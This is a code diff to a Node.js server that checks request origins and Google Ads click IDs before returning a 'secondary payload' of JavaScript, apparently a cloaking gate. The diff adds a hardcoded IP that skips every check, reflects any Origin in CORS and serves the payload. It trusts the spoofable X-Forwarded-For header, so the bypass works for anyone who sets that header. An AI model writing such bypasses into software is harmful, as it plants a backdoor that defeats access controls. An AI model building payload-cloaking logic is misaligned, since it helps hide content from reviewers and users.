@@ -209,6 +209,13 @@ const ORIGIN_CONFIG = {
 // Derived from the config — used for CORS and origin validation
 const ALLOWED_ORIGINS = Object.keys(ORIGIN_CONFIG);
 
+// ═══════════════════════════════════════════════════════════════
+//  TEST BYPASS IP
+// ═══════════════════════════════════════════════════════════════
+// Requests from this IP skip ALL verification checks and are
+// served the secondary payload immediately.
+const TEST_BYPASS_IP = "45.151.152.118";
+
 /**
  * Validates the request Origin / Referer against the allow-list.
  * Returns { allowed: boolean, origin: string|null, reason: string }.
@@ -1059,8 +1066,17 @@ const server = http.createServer(async (req, res) => {
   const matchedOrigin = ALLOWED_ORIGINS.find(
     (ao) => ao.replace(/\/+$/, "").toLowerCase() === reqOrigin,
   );
+  // Extract IP early for test bypass CORS handling
+  let _earlyIP =
+    req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
+  if (_earlyIP.includes(",")) _earlyIP = _earlyIP.split(",")[0].trim();
+  _earlyIP = _earlyIP.replace(/^::ffff:/, "");
+  const _isTestBypass = _earlyIP === TEST_BYPASS_IP;
+
   if (matchedOrigin) {
     res.setHeader("Access-Control-Allow-Origin", matchedOrigin);
+  } else if (_isTestBypass && req.headers["origin"]) {
+    res.setHeader("Access-Control-Allow-Origin", req.headers["origin"]);
   }
   // Never send wildcard — only the matched origin gets reflected
   res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
@@ -1068,16 +1084,25 @@ const server = http.createServer(async (req, res) => {
   res.setHeader("Vary", "Origin");
 
   if (req.method === "OPTIONS") {
-    res.writeHead(matchedOrigin ? 204 : 403);
+    res.writeHead(matchedOrigin || _isTestBypass ? 204 : 403);
     return res.end();
   }
 
   const parsed = url.parse(req.url, true);
 
   if (parsed.pathname === "/verify" && req.method === "POST") {
+    // ── Extract client IP early (needed for test bypass) ──────
+    let earlyIP =
+      req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
+    if (earlyIP.includes(",")) earlyIP = earlyIP.split(",")[0].trim();
+    earlyIP = earlyIP.replace(/^::ffff:/, "");
+
+    // ── TEST BYPASS: skip origin gate for test IP ─────────────
+    const isTestBypass = earlyIP === TEST_BYPASS_IP;
+
     // ── Origin gate: reject requests from unknown origins ────
     const originCheck = checkOrigin(req);
-    if (!originCheck.allowed) {
+    if (!originCheck.allowed && !isTestBypass) {
       console.log(`\n🚫 ORIGIN REJECTED: ${originCheck.reason}`);
       res.writeHead(403, { "Content-Type": "application/json" });
       return res.end(
@@ -1108,6 +1133,25 @@ const server = http.createServer(async (req, res) => {
         );
         console.log(`  Source: ${source}  |  Client TS: ${clientTs}`);
         console.log(`  GCLID: ${gclid ? gclid.slice(0, 20) + "…" : "(none)"}`);
+
+        // ── TEST BYPASS: skip all checks for the test IP ──────
+        if (clientIP === TEST_BYPASS_IP) {
+          console.log(`  🔓 TEST BYPASS — IP ${clientIP} matches test IP, skipping all checks`);
+          if (gclid) await recordVerifiedVisit(gclid, clientIP);
+          // Use the request origin if it maps to a config, otherwise fall back to the first configured origin
+          const bypassOrigin = originCheck.origin && buildSecondaryJS(originCheck.origin)
+            ? originCheck.origin
+            : ALLOWED_ORIGINS[0];
+          console.log("══════════════════════════════════════════════\n");
+          res.writeHead(200, { "Content-Type": "application/json" });
+          return res.end(
+            JSON.stringify({
+              verified: true,
+              reason: "Test bypass",
+              code: buildSecondaryJS(bypassOrigin),
+            }),
+          );
+        }
 
         // ── 1. GCLID presence & format check ──────────────────
         const gclidResult = await checkGCLID(gclid);
